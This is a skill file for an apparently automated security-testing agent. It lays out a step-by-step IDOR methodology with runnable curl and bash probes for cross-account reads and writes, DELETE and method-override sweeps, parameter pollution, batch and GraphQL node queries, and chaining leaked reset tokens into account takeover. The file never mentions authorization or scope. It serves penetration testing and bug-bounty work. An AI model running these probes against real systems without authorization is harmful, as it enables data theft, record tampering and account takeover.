---
name: idor_ladder
agent: agent8_logic
description: Climb the IDOR ladder from leaked IDs to horizontal then vertical object escalation, with method confusion, parameter pollution, and batch-endpoint abuse.
---

# IDOR Ladder

## Purpose
This skill finds Insecure Direct Object Reference (IDOR) vulnerabilities — endpoints that use a user-controlled object identifier without verifying the requester owns that object. It climbs a deliberate ladder: (1) harvest object IDs from every observable surface, (2) prove horizontal escalation (user A reads/modifies user B's object), (3) pivot to vertical escalation (low-privilege role touches admin objects or endpoints). Impact is real data theft, account takeover (email/password-reset token theft), privilege escalation, and mass record disclosure via batch endpoints.

## Division of labor
- **Consumes:** endpoint list from `recon/endpoints_live.txt` (one URL per line), response samples from `recon/sample_responses/` (JSON bodies with IDs), JS bundle wordlist hits from `hidden_endpoint_discovery/wordlist_hits.txt`
- **Produces:** the finished artifact — `findings/idor_ladder_confirmed.md` containing every verdict with raw request/response pairs

## When to use / when NOT to use
- **Use when:** you observed an endpoint returning an object keyed by an ID in the path (`/api/orders/12345`), query (`?user_id=42`), or body; a list endpoint returns IDs belonging to other users; JS bundles reference `invoiceId`, `accountId`, `reportId`, or similar fields.
- **Skip when (time-pass filter):** the object is public-by-design (a public product catalog), the "leak" is only the current user's own data, or the endpoint requires a session you don't have and the ID space is non-enumerable (random 128-bit UUIDs with no horizontal signal). Ask: does it leak someone else's data? Is that data sensitive? Is it reachable unauthenticated or with a low-privilege account?

## Methodology
1. **Inventory every ID-bearing endpoint.** From the endpoint list and sample responses, extract all fields matching `(id|uuid|guid|key|number|code|token|ref)$` case-insensitively. Record each as: endpoint, HTTP method, parameter name, location (path/query/body), and a known-good ID value belonging to YOUR test account.
2. **Classify the ID format.** Sequential integers (`1001, 1002`)? UUIDv4 (random — hard to enumerate but testable for horizontal)? Hashed/encoded (`a3f9...`, base64)? Snowflake-like (`170000000123456789`, time-ordered)? For sequential or time-ordered IDs, plan arithmetic neighbors (`id-1`, `id+1`, `id±100`).
3. **Harvest IDs from every surface.** Grep sample responses, JS bundles, notification emails, CSV/PDF exports, and WebSocket messages for ID values you did NOT create. Any ID of another user, order, ticket, or invoice is ladder fuel — record the source file and line.
4. **Build two accounts.** Create test account A and test account B (or two roles: standard + support). Capture object IDs owned by each. The ladder starts here: A's ID known, B's object targeted.
5. **Horizontal read test.** With A's credentials/session, GET B's object using the exact same endpoint and method (`curl -s -i` with A's cookie on `/api/orders/<B-ID>`). Compare against the baseline: same endpoint with a known-dead ID on the same host. A 200 with B's data vs baseline 404/403 = horizontal IDOR read.
6. **Horizontal write test.** If reads are blocked, try writes: PATCH/PUT/POST to B's object with A's session (e.g. change nickname, address line). Then re-GET with B's session to confirm the mutation persisted. Write-IDOR where read-IDOR fails is a classic miss.
7. **HTTP method confusion on the object endpoint.** For every ID endpoint, replay with GET, POST, PUT, PATCH, DELETE, and `X-HTTP-Method-Override: DELETE`. Some frameworks route authorization on one method but not another — a 403 on GET that becomes 200 on POST with the same ID is a finding.
8. **Parameter pollution.** Try `?id=<A-ID>&id=<B-ID>` (last-wins vs first-wins differ per framework), `id[]=<B-ID>`, `id=<A-ID>,<B-ID>`, and JSON `{"id": [<A-ID>, <B-ID>]}`. Authorization checks often run against the first value while the query uses the second.
9. **Wrapper-object attacks.** If the endpoint expects `{"id": 123}`, try `{"id": {"id": 123}}`, `{"id": "123 "}`, `{"id": "0123"}`, `{"user": {"id": 456}}` where 456 is B's ID. Type-juggling comparisons (`==` vs `===`) in the ownership check can pass while the DB lookup uses the nested value.
10. **Batch/aggregate endpoints.** Look for `/api/orders?ids=1,2,3`, GraphQL `nodes(ids: [...])`, or bulk-export endpoints. Mix A-owned and B-owned IDs in one request. Batch handlers frequently check ownership on the first ID only, or skip checks entirely for "internal" batch routes.
11. **Export/PDF/webhook endpoints.** `/api/invoices/<id>/pdf`, `/api/reports/<id>/export.csv`, and webhook re-delivery URLs (`/webhooks/<token>/redeliver?event=<id>`) are classic IDOR sinks: the export path is built once, the auth check lives only on the HTML path. Test every export variant of every ID endpoint.
12. **Pivot to vertical escalation.** Take every horizontal vector that worked and aim it upward: low-priv user touches `role=admin` objects (admin notes, other tenants' invoices), or call low-priv endpoints with admin-namespaced IDs (`/api/tenants/<admin-tenant-id>`). Also test endpoints that return the object with MORE fields than the owner view (internal notes, cost prices, PII).
13. **Field-level IDOR.** Even when the endpoint 403s, check for partial leakage: error messages echoing B's object (`"Order 98765 is already shipped"`), timing differences, or a 200 with redacted-but-inferable fields. Record exact deltas vs baseline.
14. **GraphQL node-interface sweep.** If a GraphQL endpoint exists, query `node(id: "<B-ID>")` and `nodes(ids: [...])` with a global/relay ID, plus every `*ById` field. Relay `node` resolvers are frequently wired without the per-type ownership check that the REST endpoint has.
15. **Second-order IDOR via stored IDs.** IDs you harvest from exports, webhooks, or notification payloads may reference objects created by other flows (support tickets referencing order IDs, invoices referencing user IDs). Feed every harvested foreign ID back through steps 5–11 — the ID you didn't create is often the one nobody protected.
16. **Chaining.** A horizontal read that yields a password-reset token, API key, or email-change token becomes account takeover — follow the token immediately and document the full chain in the artifact.
17. **Stop and write.** Every tested vector gets a verdict (CONFIRMED/INCONCLUSIVE/NEGATIVE) with raw pairs in `findings/idor_ladder_confirmed.md`, even the dead ends — so nobody re-tests them.

## Exact commands
Baseline — known-dead path on the same host, same session (A's), run FIRST and keep for comparison:
```bash
curl -s -i -b cookies_A.txt "https://<HOST>/api/orders/0000000000" -o /tmp/idor_baseline.txt
# Record: baseline status, body length, and any error JSON. Every probe below is diffed against this.
wc -c /tmp/idor_baseline.txt; grep -i "^HTTP" /tmp/idor_baseline.txt
```
ID harvest from a sample response (run per surface file):
```bash
grep -Eo '"(id|uuid|userId|user_id|orderId|order_id|accountId|invoiceId|reportId|ticketId)"[ ]*:[ ]*"?[A-Za-z0-9_@.-]+"?' recon/sample_responses/*.json | sort -u > /tmp/idor_id_harvest.txt
wc -l /tmp/idor_id_harvest.txt; head -20 /tmp/idor_id_harvest.txt
```
Horizontal read probe (A reads B's object), with arithmetic neighbor sweep:
```bash
B_ID=<B-OWNED-ID>
for ID in "$B_ID" "$((B_ID-1))" "$((B_ID+1))" "$((B_ID+100))"; do
  echo "=== id=$ID ==="
  curl -s -i -b cookies_A.txt "https://<HOST>/api/orders/$ID" | head -c 600; echo
done
# CONFIRMED read-IDOR only if: status 200 AND body contains B-specific data (name, email, address)
# AND baseline for dead ID returns 404/403 with different body length.
```
Horizontal write probe + persistence check:
```bash
curl -s -i -b cookies_A.txt -X PATCH "https://<HOST>/api/profile/<B-ID>" \
  -H 'Content-Type: application/json' \
  -d '{"nickname":"idorprobe_A"}'
# Then re-read as B to verify persistence:
curl -s -b cookies_B.txt "https://<HOST>/api/profile/<B-ID>" | grep -o '"nickname":"[^"]*"'
```
Method-confusion sweep on one object endpoint:
```bash
for M in GET POST PUT PATCH DELETE; do
  echo "=== $M ==="
  curl -s -o /dev/null -w "%{http_code} %{size_download}\n" -b cookies_A.txt -X "$M" \
    "https://<HOST>/api/orders/<B-ID>"
done
curl -s -o /dev/null -w "OVERRIDE-DELETE: %{http_code} %{size_download}\n" -b cookies_A.txt \
  -H 'X-HTTP-Method-Override: DELETE' "https://<HOST>/api/orders/<B-ID>"
```
Parameter-pollution and wrapper-object probes:
```bash
curl -s -i -b cookies_A.txt "https://<HOST>/api/orders?id=<A-ID>&id=<B-ID>" | head -c 400; echo
curl -s -i -b cookies_A.txt -X POST "https://<HOST>/api/orders/batch" \
  -H 'Content-Type: application/json' -d "{\"ids\":[<A-ID>, <B-ID>]}" | head -c 800; echo
curl -s -i -b cookies_A.txt -X PATCH "https://<HOST>/api/orders/<A-ID>" \
  -H 'Content-Type: application/json' -d '{"id":{"id":<B-ID>},"nickname":"idorprobe_A"}' | head -c 400
```
Export-endpoint sink test:
```bash
for SFX in pdf csv xlsx export download; do
  echo "=== $SFX ==="
  curl -s -o /dev/null -w "%{http_code} %{size_download} %{content_type}\n" -b cookies_A.txt \
    "https://<HOST>/api/invoices/<B-ID>/$SFX"
done
```
GraphQL node-interface sweep (only if a GraphQL endpoint was observed):
```bash
for Q in '{"query":"{ node(id:\"<B-GLOBAL-ID>\") { id } }"}' \
         '{"query":"{ nodes(ids:[\"<A-GLOBAL-ID>\",\"<B-GLOBAL-ID>\"]) { id } }"}' \
         '{"query":"{ orderById(id:\"<B-ID>\") { id total } }"}'; do
  echo "=== $Q ==="
  curl -s -b cookies_A.txt -X POST "https://<HOST>/graphql" \
    -H 'Content-Type: application/json' -d "$Q" | head -c 400; echo
done
# CONFIRMED if node/nodes returns B's object fields with A's session.
```
Second-order harvest — feed foreign IDs from exports/notifications back through the battery:
```bash
grep -Eho '[0-9]{4,20}' /tmp/exports/*.csv /tmp/notifications/*.eml 2>/dev/null | sort -u > /tmp/idor_second_order.txt
wc -l /tmp/idor_second_order.txt
while read -r ID; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -b cookies_A.txt "https://<HOST>/api/orders/$ID")
  echo "id=$ID -> $CODE"
done < /tmp/idor_second_order.txt
# Any 200 on an ID you did not create restarts the ladder at step 5 for that ID.
```
2x reproduction script (run twice, save both raw outputs):
```bash
python3 - <<'EOF'
import subprocess
URL="https://<HOST>/api/orders/<B-ID>"
for run in (1,2):
    p=subprocess.run(["curl","-s","-i","-b","cookies_A.txt",URL],capture_output=True,text=True)
    open(f"/tmp/idor_repro_{run}.txt","w").write(p.stdout)
    print(f"run {run}: {p.stdout.splitlines()[0]} len={len(p.stdout)}")
EOF
# CONFIRMED requires both runs: HTTP 200 + B-specific field present + differs from baseline.
```

## Completion-bias defenses
- [ ] ID-bearing endpoints inventoried with method, param name, location, and a known-good own ID
- [ ] ID format classified per endpoint (sequential / UUID / hashed / Snowflake-like)
- [ ] IDs harvested from responses, JS, exports, notifications — other-user IDs recorded with source
- [ ] Two accounts (A and B, or two roles) created with known object IDs each
- [ ] Horizontal read tested: A's session on B's object, diffed against dead-ID baseline
- [ ] Horizontal write tested: PATCH/PUT as A on B's object + persistence re-read as B
- [ ] Method-confusion sweep run (GET/POST/PUT/PATCH/DELETE + X-HTTP-Method-Override)
- [ ] Parameter pollution tested (`id=&id=`, `id[]=`, comma list, JSON array)
- [ ] Wrapper-object attacks tested (nested id object, padded/zero-padded strings)
- [ ] Batch/aggregate endpoints tested with mixed A-owned + B-owned ID lists
- [ ] Export/PDF/CSV/webhook variants of every ID endpoint tested
- [ ] GraphQL `node(id:)` / `nodes(ids:)` and `*ById` fields swept where GraphQL exists
- [ ] Second-order pass done: every harvested foreign ID fed back through the read/write/confusion battery
- [ ] Vertical pivot attempted: low-priv session against admin/tenant objects and richer field sets
- [ ] Field-level leakage checked (error echoes, timing, redacted-but-inferable fields)
- [ ] Every vector has a verdict with raw pairs in `findings/idor_ladder_confirmed.md`
- **Review step:** agent10_review must verify for each CONFIRMED verdict: (1) a baseline run against a known-dead ID on the same host with the same session exists in the artifact, (2) two independent reproduction outputs are attached, (3) the leaked data is provably another principal's (a field the tester could not have set), and (4) vertical claims show an actual privilege boundary crossed, not just a different object.
- **Nudge prompts:** "Keep going until you have tested every parameter, not just the first one that responded." / "Do not report done before the finished artifact exists on disk." / "A 200 with your own data is not IDOR — prove the data belongs to someone else."
- **Finished artifact definition:** `findings/idor_ladder_confirmed.md` exists and contains, per tested vector: endpoint, method, parameter, the two-account setup, baseline output, both reproduction outputs, leaked-field evidence, and verdict CONFIRMED / INCONCLUSIVE / NEGATIVE.

## Evidence standard
- Baseline: compare every hit against a known-dead path on the same host
- Reproduction: 2x independent reproduction required
- Raw evidence: full request/response pairs saved
- Verdicts: CONFIRMED (meets all three) / INCONCLUSIVE (needs a second model run or human) / NEGATIVE (dead end, documented so nobody re-tests it)

## Handoffs
- `agent9_chain` consumes CONFIRMED horizontal reads: any leaked reset token, API key, or email field becomes an account-takeover chain — it needs the exact token field name and the endpoint that consumed it from the artifact.
- `auth_model_analysis` consumes NEGATIVE vectors with 403s: uniform deny shapes feed its authorization-matrix mapping — it needs the baseline vs probe status/body-length table.
- `pii_hunter` consumes CONFIRMED leaks: it classifies the exposed fields (PII vs internal) for severity — it needs the raw response bodies from the artifact.
